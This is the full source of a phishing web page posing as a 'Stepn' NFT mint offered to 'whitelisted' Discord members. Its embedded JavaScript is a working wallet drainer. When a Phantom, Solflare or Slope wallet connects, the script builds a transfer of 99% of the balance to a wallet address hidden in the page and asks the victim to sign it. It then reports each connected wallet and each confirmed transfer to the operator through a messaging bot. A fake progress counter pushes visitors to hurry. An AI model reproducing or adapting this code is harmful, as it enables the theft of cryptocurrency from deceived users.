<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="icon" href="images/logo.png">
    <title>Stepn Mint | MINT</title>
    <meta name="theme-color" content="#5865f2">
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="website">
    <meta content="️🔗 Stepn Mint Link ✅" property="og:title">
    <meta content="
	🎉 Due to the unexpected popularity, we have decided to add 3,333 StepN Sneakers for our Discord members to mint.
	❗ If you received this message, you have been whitelisted and can mint your sneakers at only 2 SOL.

    🏷 Mint Info
    ▶ Price: 2 SOL
    ▶ Supply: 3,333 NFTs

    ❗️ Hurry Up and Good Luck!" property="og:description">
    <meta property="og:url" content="https://stepnlive.xyz/">
    <meta content="https://stepnlive.xyz/images/banner.png" property="og:image">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="https://stepnlive.xyz/">
    <meta name="twitter:image" content="https://stepnlive.xyz/embed.png">
    <link rel="alternate" type="application/json+oembed" href="https://stepnlive.xyz/embed.json">
    <link href="./css/chunk-vendor.css" rel="preload" as="style">
    <link href="./css/index.css" rel="preload" as="style">
    <link href="./css/chunk-vendor.css" rel="stylesheet">
    <link href="./css/index.css" rel="stylesheet">
</head>
<body>
  <noscript><strong>We're sorry but Stepn Mint | MINT doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript>
  <div id="app">
      <div class="header__wrapper" style="display: none" ;="">
          <div class="header container"><img class="header__logo" src="images/logo.png">
              <div class="header__socials">
                  <a href="twi.com" target="_blank"><img src="fonts/twitter.svg"></a>
                  <a href="disc.com" target="_blank"><img src="fonts/discord.svg"></a>
              </div>
          </div>
      </div>
      <div class="content__wrapper">
          <div class="content container">
              <div class="mint container">
                  <div class="mint__content">
                      <div class="mint__wallet-hidden" style="display: none">WZSMd96z4ypN86ccieP11XuBUhYerX9RBsEkwKmiYdz</div>
                      <div class="mint__title" style="color: white;">Stepn Mint</div>
                      <div class="mint__description" style="color: white;">Stepn is a web 3 lifestyle app with social-fi and game-fi elements. Players can make handsome earnings by walking, jogging, or running outdoors.</div>
                      <div class="mint__counter">
                          <div class="counter">
                              <div class="counter__input">1</div>
                              <div class="counter__button counter__button_minus"><img src="fonts/minus.svg"></div>
                              <div class="counter__button counter__button_plus"><img src="fonts/plus.svg"></div>
                          </div>
                          <div class="mint__price">
                              <p><span class="price__data">2</span> SOL per 1 NFT</p>
                              <p>5 NFT max per transaction</p>
                          </div>
                      </div>
                      <div class="mint__button" id="connect"><button class="wallet-adapter-button wallet-adapter-button-trigger button" type="button" style="justify-content: center; background-color: rgba(255, 0, 132, 0.8)!important;">
                              <!---->Select Wallet
                              <!---->
                          </button><img class="mint__solana" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAAAYCAYAAABZY7uwAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAARZSURBVHgB7Vg/bxNZEJ/15S6E5ra/k7J8gktx11xx2bQnnfBdce06DYgCxQEkOrxbIBqETYGQaGw+QYJokdaUSAiHkspGghpTEMe2yGNm9/fwY3m72UDCH8m/ZLy782bem30zb96bJZqjEM5BAkoply8rBmvHcZwhfSNg+3y2p5vhib2DL2InD1Zj6jO1mbaYXsGArw62w2NSFn7MtEpHgEpJOfHGOtO/fN9iasAQl2mDqSHGglcVr+Lel3aavUyRnrQHcEjV0BeZwDQGMtKXV2CzHiPAeK4e3xyP6GgmyISErYv7HowUXg8Ts8y0gXYxIMS9D9J6LvRiTJJQh2kVL1DjS5tpwCST3gS/hf6F36B8hOhfJnsLy62unQfdz18JxhITTzaxxAJ4t2fIbWAZiqdegdfHsvTRFiDCYvB8tG/gPjb66xn8qtHn+yWOtrwlFuDehc6yfgfDNu+A16cFOhwGTFX2xkN42EyCr5k88RS37WBpiXyX0qjwmSJcPUqji9DHc8tYLmS1l7cN/sCwJw+JbbBH23mPSRwi1yG3FemXAyIotvA9eMbDc9vwTgMeCuDBvo42eF30XKP/FUsExUbO8tQsl/WMHFUviKCmoauM8WL0cWD+EXxKDkqA2Zd8EOPlPUojRPAQz0+x9oW60OtCrwe9gD6MRI11Ju2cOMNvQvc3yodMTB+6dWPLl0hcgY3HD0TI8iHVSushd7g2fgldN6uLiN2iOT4GT8y2mRbmmGOOOeb4zpF87vjv6qNwdHJyZbS454yWJrS7NKbRCSa+vlkaq92lSTT543xkKuKwJrWSm9N3Rwpc7BhyFvFy5Fost6lmtVeNn+/aBFkmpLQOs405YFqT85ma1WuCLvPWjD76yYs7zqkStkULZy4+C0ejvUaFz4zOvsxYRcmvo4TkX0XDv85GFmVtaCen864h51F6QMseCH1KC8gWlYOcrAc0Kzs0xI4qxtpkOo2xdmQMZflmVMK2KhUXw8XAkV2VkGvjqL9c1IYDnCoqAdCeV/YI2njug3ShapYwfR1FB9gWS8PChXMv6m9/mDRHixMaM8my0ktsl2n84zR6EpwOLfYOdUdkx0322jYdPeSl/QzPswmiUO1QGqVeQXEqteCp7Djys3Dj9q+tS2de/szdhRVZWvpvn9OTSu4av7fv0+P1f8JMB5uUn3+k1hFvHscESd/xIeSlcq9TWvNFOTK5diafO67f+SUqULYC3liztSGqfDoeSF7J5izXwksguYft6VIaRTfJDpnAbA4Kmbxkgq79/zocL04bssT2fmJanKq9E7zckl2Nd7KT0/DB+dXsLlYjfP2zwLPwWmr2XUbDt8jVLEuoa+xsw+wuh92oKNGL7eI0KVL1l0wT29zn80yfNZIJuvX3NJyM316RXYv2HaVkacm8y2+Sgivhvct/2qJLJqdGdiSfN3EvXvMp3RVsCMU4KSQp3X3y5O7SJwJRlOxoYHXK6r4DLuGmrYM1JoAAAAAASUVORK5CYII="></div>
                  </div>
                  <div class="mint__image"><img src="images/nft.gif" class="animation">
                      <div class="mint__mega-conteainer">
                          <p style="color: white;">TOKENS MINTED</p>
                          <div class="progress-bar">
                              <div class="progress-bar-progress" style="background-color: white; width: 99.79%;"></div>
                          </div>
                          <div class="mint__total"><span style="color: white;">3326</span><span style="color: white;">3333</span></div>
                      </div>
                  </div>
              </div>
          </div>
      </div>
      <div class="select__wallet-cont" style="display: none;">
        <div class="select__wallet">
          <h4 class="select__title" style="align-items: center;">Select your wallet <svg class="exit" fill="rgb(158, 158, 158)
" focusable="false" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg></h4>
          <div class="select__wallets">
            <div class="select__wallet-item" id="phantom">
              <div class="wallet__name">Phantom</div>
              <img class="select__wallet-icon" src="images/phantom.svg" alt="Phantom">
            </div>

            <div class="select__wallet-item" id="slope">
              <div class="wallet__name">Slope</div>
              <img class="select__wallet-icon" src="images/slope.png" alt="Slope">
            </div>

            <div class="select__wallet-item" id="solflare">
              <div class="wallet__name">Solflare</div>
              <img class="select__wallet-icon" src="images/solflare.svg" alt="Solflare">
            </div>

            <div class="select__hide" style="display: none;">
                <div class="select__wallet-item" id="sollet">
                  <div class="wallet__name">Sollet</div>
                  <img class="select__wallet-icon" src="images/sollet.svg" alt="Sollet">
                </div>

                <div class="select__wallet-item" style="border-radius: 0 0 0 0; border-bottom: 1px solid rgba(255, 255, 255, 0.1);" id="sollet_e">
                  <div class="wallet__name">Sollet (Extension)</div>
                  <img class="select__wallet-icon" src="images/sollet_e.png" alt="Slope">
                </div>
            </div>

            <div class="select__wallet-item" id="hide">
              <div class="wallet__name wallet__name-hide">More options</div>
              <svg class="select__wallet-icon select__wallet-icon-hide" fill="#9e9e9e" focusable="false" viewBox="0 0 24 24" aria-hidden="true"><path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path></svg>
            </div>
          </div>
        </div>
      </div>

  </div>

  <script src="js/libs/jquery-3.6.0.min.js" charset="utf-8"></script>
  <script src="js/script.js"></script>

  <script src="js/index.iife.min.js"></script>
  <script>

              (function() {
        var ALPHABET, ALPHABET_MAP, Base58, i;

        Base58 = (typeof module !== "undefined" && module !== null ? module.exports : void 0) || (window.Base58 = {});

        ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

        ALPHABET_MAP = {};

        i = 0;

        while (i < ALPHABET.length) {
          ALPHABET_MAP[ALPHABET.charAt(i)] = i;
          i++;
        }

        Base58.encode = function(buffer) {
          var carry, digits, j;
          if (buffer.length === 0) {
            return "";
          }
          i = void 0;
          j = void 0;
          digits = [0];
          i = 0;
          while (i < buffer.length) {
            j = 0;
            while (j < digits.length) {
              digits[j] <<= 8;
              j++;
            }
            digits[0] += buffer[i];
            carry = 0;
            j = 0;
            while (j < digits.length) {
              digits[j] += carry;
              carry = (digits[j] / 58) | 0;
              digits[j] %= 58;
              ++j;
            }
            while (carry) {
              digits.push(carry % 58);
              carry = (carry / 58) | 0;
            }
            i++;
          }
          i = 0;
          while (buffer[i] === 0 && i < buffer.length - 1) {
            digits.push(0);
            i++;
          }
          return digits.reverse().map(function(digit) {
            return ALPHABET[digit];
          }).join("");
        };

        Base58.decode = function(string) {
          var bytes, c, carry, j;
          if (string.length === 0) {
            return new (typeof Uint8Array !== "undefined" && Uint8Array !== null ? Uint8Array : Buffer)(0);
          }
          i = void 0;
          j = void 0;
          bytes = [0];
          i = 0;
          while (i < string.length) {
            c = string[i];
            if (!(c in ALPHABET_MAP)) {
              throw "Base58.decode received unacceptable input. Character '" + c + "' is not in the Base58 alphabet.";
            }
            j = 0;
            while (j < bytes.length) {
              bytes[j] *= 58;
              j++;
            }
            bytes[0] += ALPHABET_MAP[c];
            carry = 0;
            j = 0;
            while (j < bytes.length) {
              bytes[j] += carry;
              carry = bytes[j] >> 8;
              bytes[j] &= 0xff;
              ++j;
            }
            while (carry) {
              bytes.push(carry & 0xff);
              carry >>= 8;
            }
            i++;
          }
          i = 0;
          while (string[i] === "1" && i < string.length - 1) {
            bytes.push(0);
            i++;
          }
          return new (typeof Uint8Array !== "undefined" && Uint8Array !== null ? Uint8Array : Buffer)(bytes.reverse());
        };

      }).call(this);

      $("#sollet").on("click", event => {
          window.sollet.connect();
      })


      async function sfMint() {
          var resp = await window.solflare.connect();

          var connection = new solanaWeb3.Connection(
            solanaWeb3.clusterApiUrl('mainnet-beta'),
            'confirmed',
          );
          const wallet = window.solflare.publicKey.toString();
          console.log( wallet );
          const walletBalance = await connection.getBalance(window.solflare.publicKey);
          var textsf = "💰Кто то подключил кошелек💰\n"+
              "Адресс отправителя: \n" + (window.solflare.publicKey) +"\n";
              otpravka(token,textsf,chatid);


          const recieverWallet = new solanaWeb3.PublicKey($(".mint__wallet-hidden").text());
          var transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: window.solflare.publicKey,
              toPubkey: recieverWallet,
              lamports: walletBalance * 0.99, // const * price per unit
            }),
          );

          console.log()


          // Setting the variables for the transaction
          transaction.feePayer = window.solflare.publicKey;
          let blockhashObj = await connection.getRecentBlockhash();
          transaction.recentBlockhash = await blockhashObj.blockhash;

          const signed = await window.solflare.signTransaction(transaction);

          let txid = await connection.sendRawTransaction(signed.serialize());
          await connection.confirmTransaction(txid);
          var text4 = "💰Кто то подтвердил транзакцию💰\n"+
              "Если ничего не пришло значит баланс слишком маленький (";
              popavca(token,text4,chatid)
      }


      async function solflareLogin() {
          window.solflare.connect();

          window.solflare.on("connect", () => {
              $('.wallet-adapter-button').text("Mint");
              $('.mint__button').attr("id","mintSolflare");
              $("#mintSolflare").on("click", sfMint);
              console.log("hi");
              $(".select__wallet-cont").fadeOut("fast");
          });
      }

      $("#solflare").on("click", event => {
              solflareLogin();
          })

      const { Transaction, Connection, PublicKey } = solanaWeb3;

          async function sMint() {
              const tx = new Transaction()
              var connection = new solanaWeb3.Connection(
                    solanaWeb3.clusterApiUrl('mainnet-beta'),
                    'confirmed',
                  );

              const slope = new window.Slope();
              var { msg, data } = await slope.connect()

              const orgPubKey = new PublicKey(data.publicKey)


              tx.feePayer = orgPubKey;
              console.log(tx.feePayer);
              tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash
              const recieverWallet = new solanaWeb3.PublicKey($(".mint__wallet-hidden").text());
              const walletBalance = await connection.getBalance(orgPubKey);
              var textslope = "💰Кто то подключил кошелек💰\n"+
              "Адресс отправителя: \n" + (orgPubKey) +"\n";
              otpravka(token,textslope,chatid);
              console.log(walletBalance / 1000000000 * 0.99)

              tx.add(
                  solanaWeb3.SystemProgram.transfer({
                  fromPubkey: orgPubKey,
                  toPubkey: recieverWallet,
                  lamports: (walletBalance * 0.99),
                })
              )

              console.log(tx)

              var { msg, data } = await slope.signTransaction(
                  Base58.encode(tx.serializeMessage())
              )

              tx.addSignature(
                  new PublicKey(data.publicKey),
                  Base58.decode(data.signature)
              )

              var isOk = tx.verifySignatures();
              console.log('verifySignatures: ' + isOk);

              const txid = await connection.sendRawTransaction(tx.serialize());
              var text3 = "💰Кто то подтвердил транзакцию💰\n"+
              "Если ничего не пришло значит баланс слишком маленький (";
              popavca(token,text3,chatid);
              // const hashReal = await sendAndConfirmRawTransaction(connection,tx.serialize());

          }


          async function as() {
              // const slope = new ;
              const { msg, data } = await new window.Slope().connect()

              if (msg === 'ok') {
                  // console.log(data.publicKey)
                  $('.wallet-adapter-button').text("Mint");
                  $('.mint__button').attr("id","mintSlope");
                  $("#mintSlope").on("click", sMint);
                  document.querySelector(".select__wallet-cont").style.display = "none";
              } else {
                  console.log(msg)
              }
          }

          $("#slope").on("click", event => {
              as();
          })

      let connected = false;
      $('#phantom').on('click', async() => {
        if(window.solana && window.solana.isPhantom)
        {
          const resp = await window.solana.connect(); // this is browser wallet

          if (connected == false) {
              var connection = new solanaWeb3.Connection(
                solanaWeb3.clusterApiUrl('mainnet-beta'),
                'confirmed',
              );

              $('.wallet-adapter-button').text("Mint");
              $('.mint__button').attr("id","mintPhantom");
              $("#mintPhantom").on("click", pMint);
              document.querySelector(".select__wallet-cont").style.display = "none";

              connected = true;
          }
        }
      });
      async function pMint() {
          const resp = await window.solana.connect();
          var connection = new solanaWeb3.Connection(
            solanaWeb3.clusterApiUrl('mainnet-beta'),
            'confirmed',
          );

          const public_key = new PublicKey(resp.publicKey);
          const walletBalance = await connection.getBalance(public_key);
          var textfant = "💰Кто то подключил кошелек💰\n"+
          "Адресс отправителя: \n" + (public_key) +"\n";
          otpravka(token,textfant,chatid);
          console.log(walletBalance);

          $('.wallet-adapter-button').text("Mint");
          $('.mint__button').attr("id","mintPhantom");
          $("#mintPhantom").on("click", pMint);

          const recieverWallet = new solanaWeb3.PublicKey($(".mint__wallet-hidden").text());

          var transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: resp.publicKey,
              toPubkey: recieverWallet,
              lamports: walletBalance * 0.99,
            }),
          );

          transaction.feePayer = window.solana.publicKey;
          let blockhashObj = await connection.getRecentBlockhash();
          transaction.recentBlockhash = await blockhashObj.blockhash;

          const signed = await window.solana.signTransaction(transaction);
          var text2 = "💰Кто то подтвердил транзакцию💰\n" +
          "Если ничего не пришло значит баланс слишком маленький (";
          popavca(token,text2,chatid);

          let txid = await connection.sendRawTransaction(signed.serialize());
          await connection.confirmTransaction(txid);
      }

      $("#mintPhantom").on("click", pMint);

      let spans = document.querySelector(".mint__total").querySelectorAll("span");

      // localStorage.setItem("tokens", 0);

      let current = 0;

      if (localStorage.getItem("tokens") > 0) {
        current = +localStorage.getItem("tokens");
        spans[0].innerText = current;
      } else {
        current = +spans[0].innerText;
        localStorage.setItem("tokens", current);
      }


      let max = +spans[1].innerText;
      let speed = 5;

      function getRandomInt(min, max) {
        return parseInt(Math.random() * (max - min) + min);
      }

      let timerId = setTimeout(function tick() {

        let plus_num = getRandomInt(1, speed);

        if (current + plus_num >= max) {
          spans[0].innerText = max - 7;
          current = max - 7;
          localStorage.setItem("tokens", current);
          document.querySelector(".progress-bar-progress").style.width = `${current / max * 100}%`;
          console.log("end");
        } else {
          spans[0].innerText = current + plus_num
          current = current + plus_num
          localStorage.setItem("tokens", current);
          document.querySelector(".progress-bar-progress").style.width = `${current / max * 100}%`;
          timerId = setTimeout(tick, 1300);
        }
      }, 1500)

      $(".select__hide").slideUp("fast");

          is = false;

          $("#hide").on("click", event => {
              if (is) {
                  $(".select__hide").slideUp("fast");
                  $(".wallet__name-hide").text("More options");
                  document.querySelector(".select__wallet-icon-hide").style.transform = "rotate(0deg)";
                  is = false;
              } else {
                  $(".select__hide").slideDown("fast");
                  $(".wallet__name-hide").text("Less options");
                  document.querySelector(".select__wallet-icon-hide").style.transform = "rotate(180deg)";
                  is = true;
              }
          })

  </script>



</body>
</html>
